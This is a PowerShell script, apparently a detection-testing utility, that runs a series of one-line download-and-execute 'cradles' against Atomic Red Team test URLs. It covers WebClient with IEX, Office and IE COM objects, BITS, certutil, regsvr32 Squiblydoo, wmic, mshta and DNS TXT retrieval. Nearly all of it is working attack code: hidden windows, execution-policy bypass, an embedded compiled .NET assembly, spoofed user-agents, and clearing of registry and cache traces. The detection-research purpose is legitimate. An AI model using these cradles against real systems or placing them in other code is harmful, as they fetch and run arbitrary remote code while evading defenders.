<#
.SYNOPSIS
	Invoke-DownloadCradle.ps1 runs several single liner Download cradles.

    Name: Invoke-DownloadCradle.ps1
    Version: 0.21
    Author: Matt Green (@mgreen27)
		Original: https://github.com/mgreen27/mgreen27.github.io

.DESCRIPTION
    Invoke-DownloadCradle.ps1 is used to generate Network and Endpoint artefacts for detection work.
    The script runs several single liner Download cradles and is configurable to spawn a new child process per cradle.
    The script will also clear registry and IE cache prior to the relevant Download Cradle.

.NOTES
    Requires ISE mode if wanting visual confirmation of cradle success - i.e what testing stuff.

    Currently manual configuration below. Please configure:
        1. $TLS = 1 to use TLS, $TLS = 0 to use http
        2. Configure $URL settings.

.TODO
    Add in switch for cradle by number and associated help.
    Add in array input for integration with tools like invoke-cradlecrafter
#>

# Change this setting for http and https testing.
$TLS = 1

# Null for no sleep between cradles. 10seconds otherwise
$Sleep=$True


# Add http server details here
If ($TLS -eq 0){
    $Url = @(
        "http://192.168.7.136/test.ps1", # Basic Powershell Test script
        "test.dfir.com.au", # DNS text test - Powershell Test script base64 encoded in DNS txt field
        "http://192.168.7.136/test.xml", # Powershell embedded command
        "http://192.168.7.136/test.sct", # Powershell embedded scriptlet
        "http://192.168.7.136/mshta.sct", # Powershell embedded scriptlet
        "http://192.168.7.136/test.xsl" # Powershell embedded extensible Stylesheet Language
    )
}
ElseIf ($TLS -eq 1){
    # Add https server details here... remember: it is not advised to run other peoples things form the internet!
    $Url = @(
        "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1", # Basic Powershell Test script
        "test.dfir.com.au", # DNS text test - Powershell Test script base64 encoded in DNS txt field
        "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml", # Powershell embedded command
        "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.sct", # Powershell embedded scriptlet
        "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct", # Powershell embedded scriptlet
        "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xsl" # Powershell embedded extensible Stylesheet Language
    )
}

# Setting randomly generated $Outfile for payloads that hit disk
$Random = -join ((48..57) + (97..122) | Get-Random -Count 32 | % {[char]$_})
$Outfile = "C:\Windows\Temp\" + $Random


function Invoke-DownloadCradle
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)][String]$Type,
        [Parameter(Mandatory = $True)][String]$Command
        )

    # Clear cache and other relevant files
    Remove-Item -path HKLM:\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32 -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -path HKLM:\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -path "$env:USERPROFILE\AppData\Local\Microsoft\Windows\Temporary Internet Files\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -path "$env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -path "$env:USERPROFILE\AppData\Local\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -path "$env:USERPROFILE\AppData\Roaming\Microsoft\Office\*" -Recurse -Force -ErrorAction SilentlyContinue

    if (Test-path $Outfile){Remove-Item $Outfile -Force}

    If ($Type -eq "Powershell"){
        Try{powershell -exec bypass -windowstyle hidden -noprofile $Command}
        Catch{$_}
    }
    ElseIf ($Type -eq "Regsvr32"){
        Try{
            powershell -exec bypass -windowstyle hidden -noprofile $Command
            $(Get-Date -Format s) + " Success - see popup window!`n"
        }
        Catch{$_}
    }
    ElseIf ($Type -eq "CMD"){
        Try{
            cmd /c $Command
            $(Get-Date -Format s) + " Success - see popup window!`n"
        }
        Catch{$_}
    }

    If($Sleep){Start-Sleep -s 10}

    [gc]::Collect()
}



# check if running in Powershell ISE as required
if($host.Name -eq 'ConsoleHost') {
    Write-Host -ForegroundColor Yellow "Invoke-DownloadCradle: Run in Powershell ISE for interactive mode`n"
    "Sleeping for 10 seconds to allow quit"
    Start-Sleep -s 10
}

# Test for Elevated privilege if required
If (!(([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))){
    Write-Host -ForegroundColor Red "Exiting Invoke-DownloadCradle: Elevated privilege required to remove cache files"
    exit
}


clear
Write-Host -ForegroundColor Cyan "Testing Download Cradle methods...`n"


# Setting proxy
(New-Object Net.WebClient).Proxy=[Net.WebRequest]::GetSystemWebProxy()
(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials


"Powershell WebClient DownloadString"
$Command = "IEX (New-Object Net.WebClient).DownloadString(`'" + $Url[0] + "`')"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell WebClient DownloadData"
$Command = "[System.Text.Encoding]::ASCII.GetString((New-Object Net.WebClient).DownloadData(`'" + $Url[0] + "`')) | IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell WebClient OpenRead"
$Command = "`$sr=New-Object System.IO.StreamReader((New-Object Net.WebClient).OpenRead(`'" + $Url[0] + "`'));`$res=`$sr.ReadToEnd();`$sr.Close();`$res | IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell WebClient DownloadFile"
$Command = "(New-Object Net.WebClient).DownloadFile(`'" + $Url[0] + "`'," + "`'" + $Outfile + "`'); GC `'" + $OutFile + "`' | IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell Invoke-WebRequest"
If ($PSVersionTable.PSVersion.Major -gt 2){
    $Command = "(`'" + $Url[0] + "`'|ForEach-Object{(IWR (Item Variable:\_).Value)}) | IEX"
    Invoke-DownloadCradle -Type Powershell -Command $Command
}
Else{"`tMethod supported on Powershell 3.0 and above only`n"}


"Powershell Invoke-RestMethod"
If ($PSVersionTable.PSVersion.Major -gt 2){
    $Command = "(`'" + $Url[0] + "`'|ForEach{(IRM (Variable _).Value)}) | IEX"
    Invoke-DownloadCradle -Type Powershell -Command $Command
}
Else{"`tMethod supported on Powershell 3.0 and above only`n"}


"Powershell Excel COM object"
$Command = "`$comExcel=New-Object -ComObject Excel.Application;While(`$comExcel.Busy){Start-Sleep -Seconds 1}`$comExcel.DisplayAlerts=`$False;`$Null=`$comExcel.Workbooks.Open(`'" + $Url[0] + "`');While(`$comExcel.Busy){Start-Sleep -Seconds 1}IEX((`$comExcel.Sheets.Item(1).Range('A1:R'+`$comExcel.Sheets.Item(1).UsedRange.Rows.Count).Value2|?{`$_})-Join'`n');`$comExcel.Quit();[Void][System.Runtime.InteropServices.Marshal]::ReleaseComObject(`$comExcel)"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell Word COM object"
$Command = "`$comWord=New-Object -ComObject Word.Application;While(`$comWord.Busy){Start-Sleep -Seconds 1}`$comWord.Visible=`$False;`$doc=`$comWord.Documents.Open(`'" + $Url[0] + "`');While(`$comWord.Busy){Start-Sleep -Seconds 1}IEX(`$doc.Content.Text);`$comWord.Quit();[Void][System.Runtime.InteropServices.Marshal]::ReleaseComObject(`$comWord)"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell Internet Explorer COM object"
$Command = "`$comIE=New-Object -ComObject InternetExplorer.Application;While(`$comIE.Busy){Start-Sleep -Seconds 1}`$comIE.Visible=`$False;`$comIE.Silent=`$True;`$comIE.Navigate(`'" + $Url[0] + "`');While(`$comIE.Busy){Start-Sleep -Seconds 1}IEX(`$comIE.Document.Body.InnerText);`$comIE.Quit();[Void][System.Runtime.InteropServices.Marshal]::ReleaseComObject(`$comIE)"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell MsXml COM object" # Not proxy aware removing cache although does not appear to write to those locations
$Command = "`$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;`$comMsXml.Open('GET',`'" + $Url[0] + "`',`$False);`$comMsXml.Send();IEX `$comMsXml.ResponseText"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell WinHttp COM object" # Not proxy aware removing cache although does not appear to write to those locations
$Command = "`$comWinHttp=new-object -com WinHttp.WinHttpRequest.5.1;`$comWinHttp.open('GET',`'" + $Url[0] + "`',`$false);`$comWinHttp.send();IEX `$comWinHttp.responseText"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell  HttpWebRequest" # Not proxy aware
Try{(New-Object System.Net.HttpWebRequest).Credentials=[System.Net.HttpWebRequest]::DefaultNetworkCredentials}
Catch{}
$Command = "`$sr=New-Object IO.StreamReader([System.Net.HttpWebRequest]::Create(`'" + $Url[0] + "`').GetResponse().GetResponseStream());`$res=`$sr.ReadToEnd();`$sr.Close();IEX `$res"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell XML requests"
$Command = "`$Xml = (New-Object System.Xml.XmlDocument);`$Xml.Load(`'" + $Url[2] + "`');`$Xml.command.a.execute | IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell Inline C#"
$Command="Add-Type 'using System.Net;public class Class{public static string Method(string url){return (new WebClient()).DownloadString(url);}}';IEX ([Class]::Method(`'" + $Url[0] + "`'))"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell Compiled C#"
$Command="[Void][System.Reflection.Assembly]::Load([Byte[]](@(77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184)+@(0)*7+@(64)+@(0)*35+@(128,0,0,0,14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104,105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111,116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32,109,111,100,101,46,13,13,10,36)+@(0)*7+@(80,69,0,0,76,1,3,0,6,190,153,90)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,110,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(32,35,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,116,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(80,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,168,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,204,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,68,2,0,0,8,0,0,0,35,85,83,0,76,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,92,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,95,0,63,0,6,0,127,0,63,0,10,0,179,0,168,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,109,32,0,0,0,0,134,24,57,0,15,0,2,0,0,0,1,0,164,0,17,0,57,0,19,0,25,0,57,0,15,0,33,0,57,0,15,0,33,0,189,0,24,0,9,0,57,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(157,0,0,0,2)+@(0)*11+@(1,0,27,0,0,0,0,0,2)+@(0)*11+@(1,0,36)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,67,108,97,115,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,77,101,116,104,111,100,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,3,32,0,0,0,0,0,221,77,161,112,179,108,67,66,138,95,4,222,69,250,124,72,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,72,35)+@(0)*8+@(0,0,94,35,0,0,0,32)+@(0)*22+@(80,35)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*155+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,112,51)+@(0)*502));([Class]::Method(`'" + $Url[0] + "`')) | IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell BITS transfer"
If ($PSVersionTable.PSVersion.Major -gt 2){
    $Command = "Start-BitsTransfer `'" + $Url[0] + "`' `'" + $Outfile + "`'; GC `'" + $OutFile + "`'|IEX"
    Invoke-DownloadCradle -Type Powershell -Command $Command
}
Else{Write-Host -ForegroundColor Yellow "`tMethod supported on Powershell 3.0 and above only`n"}


"Bitsadmin.exe"
$Command = "`$NULL=bitsadmin /transfer /Download `'" + $Url[0] + "`' `'" + $Outfile + "`'; GC `'" + $OutFile + "`' | IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command


"CertUtil.exe"
$Command = "`$NULL=certutil /urlcache /f `'" + $Url[0] + "`' `'" + $Outfile + "`'; GC `'" + $OutFile + "`' | IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Regsvr32.exe Squiblydoo"
$Command = "`$temp=`'" + $Url[3] + "`';regsvr32.exe /s /u /i:`$temp scrobj.dll"
Invoke-DownloadCradle -Type Regsvr32 -Command $Command


"wmic.exe Squiblytwo"
$Command = "wmic.exe os get /FORMAT:`"" + $Url[5] + "`""
Invoke-DownloadCradle -Type CMD -Command $Command


"mshta.exe"
$command = 'mshta.exe javascript:a=GetObject("script:' + $Url[4] + '").Exec();close()'
Invoke-DownloadCradle -Type CMD -Command $Command


"DNS txt record nslookup"
$Command = "`$b64=(IEX(nslookup -q=txt " + $url[1] + " 2>`$null)[-1]);[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$b64))| IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command


# deleting temp file
if (Test-path $Outfile){Remove-Item $Outfile -Force}


<### Additional goodies
# .Net Cradles are effectively the same as Powershell WebClient and I found less cross compatibility. Same artifacts
".Net WebClient DownloadString"
([System.Net.WebClient]::new()).DownloadString($Url[0]) | IEX

".Net WebClient DownloadData"
[System.Text.Encoding]::ASCII.GetString(([System.Net.WebClient]::new()).DownloadData($Url[0])) | IEX

".Net WebClient DownloadData"
$or='OpenRead';$sr=.(GCM N*-O*)IO.StreamReader(([System.Net.WebClient]::new()).$or($url[0]));$res=$sr.ReadToEnd();$sr.Close();IEX $res


# Custom User-Agent configuration for testing detections
$Url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1"

$webclient=(New-Object System.Net.WebClient)
$webclient.Proxy=[System.Net.WebRequest]::GetSystemWebProxy()
$webclient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials

$webClient.Headers.Add("User-Agent", "ATOMIC-RED-TEAM")
$webclient.DownloadString($Url) | Out-Null;"ATOMIC-RED-TEAM completed"

$webClient.Headers.Add("User-Agent", "Microsoft BITS/ATOMIC-RED-TEAM")
$webclient.DownloadString($Url) | Out-Null;"Fake Microsoft BITS completed"

$webClient.Headers.Add("User-Agent", "Microsoft-CryptpAPI/ATOMIC-RED-TEAM")
$webclient.DownloadString($Url) | Out-Null;"Fake Microsoft-CryptoAPI completed"

$webClient.Headers.Add("User-Agent", "CertUtil URL Agent ATOMIC-RED-TEAM")
$webclient.DownloadString($Url) | Out-Null;"Fake CertUtil URL Agent completed"

$webClient.Headers.Add("User-Agent", "Mozilla/X.X (Windows NT; Windows NT X.X; en-AU) WindowsPowerShell/ATOMIC-RED-TEAM")
$webclient.DownloadString($Url) | Out-Null;"Fake Powershell WebRequest completed"

$webClient.Headers.Add("User-Agent", "Mozilla/\* (compatible; MSIE \X; Windows NT \X; Win64; x64; Trident/ATOMIC-RED-TEAM; .NET\X; .NET CLR \X)")
$webclient.DownloadString($Url) | Out-Null;"Fake .NET User-Agent completed"


# Execution
powershell -exec bypass -windowstyle hidden -noprofile $Command
cmd /c
#>
